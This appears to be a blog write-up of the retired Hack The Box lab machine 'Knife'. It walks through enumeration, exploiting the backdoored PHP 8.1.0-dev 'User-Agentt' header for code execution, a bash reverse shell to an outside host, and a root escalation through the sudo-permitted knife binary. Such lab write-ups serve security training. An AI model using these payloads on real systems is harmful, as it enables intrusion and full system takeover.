Hello guys!

This week's machine will be **Knife**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [MrKN16H](https://app.hackthebox.eu/users/98767).<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.

This was a pretty straightforward box where you must pay attention to the details (in the case of the vulnerable web server) and always go for the low-hanging fruits first like abusing the `sudo` permissions user already have.

I hope you guys enjoy it!

## Enumeration

As usual, started with a quick `nmap` scan to check the published services on this box:

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.242
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 17:50 -03
Nmap scan report for 10.10.10.242
Host is up (0.072s latency).
Not shown: 998 closed ports

```

### 80/TCP - HTTP Service

Accessing the website we can see a simple institutional page from a health company, as below:

![HTB Knife - HTTP Service](https://i.imgur.com/oAbssxJ.png){: .align-center}

After accessing the website, gathered some information about the page, its components, and the server from which it was published using `whatweb,` and what called attention was the `X-Powered-By` header pointing to a **dev** version of **PHP 8.1.0**.

```bash
$ whatweb --color=never -a 3 10.10.10.242 | tee whatweb.txt
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], , Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

## Initial Access and User flag

As dev versions often contain vulnerabilities, decided to search it using `searchsploit` and found an RCE vulnerability as listed below:

```bash
$ searchsploit "8.1.0-dev"
---------------------------------------------------------------------- ----------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ----------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                   | php/webapps/49933.py
---------------------------------------------------------------------- ----------------------------
Shellcodes: No Results
```

This vulnerability consists in a backdor which was added in some commits of PHP source code by compromised accounts and, when a request arrives with a header `User-Agentt: "zerodiumsystem('cmd');"`, the `cmd` will be interpreted and executed in the system. The payload available emulate a non-interactive shell and, from it, started an interactive session using the payload `bash -c 'bash -i >& /dev/tcp/10.10.10.10/4443 0>&1'` which returned a session from **james**'s user account, where in his home directory I was able to read the contents of `user.txt`, obtaining the first flag.

```bash
james@knife:~$ id && hostname
uid=1000(james) gid=1000(james) groups=1000(james)
knife
james@knife:~$ cat user.txt
<redacted>
```

## Root flag

As usual, started with the command `sudo -l` and we were lucky once again, as output below:

```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
   (root) NOPASSWD: /usr/bin/knife              
```

Doing a quick search on this binary, found out that it's related to [Chef's Configuration Management Solution](https://www.chef.io/) and, according to [knife \| GTFOBins](https://gtfobins.github.io/gtfobins/knife/#sudo) page, could be easily used to privesc to root, as below, allowing us to get the final flag :smiley:

```bash
james@knife:~$ sudo /usr/bin/knife --help                                                                                 Chef Infra Client: 16.10.8

james@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
# cat root.txt
<redacted>
```

I hope you guys have enjoyed!
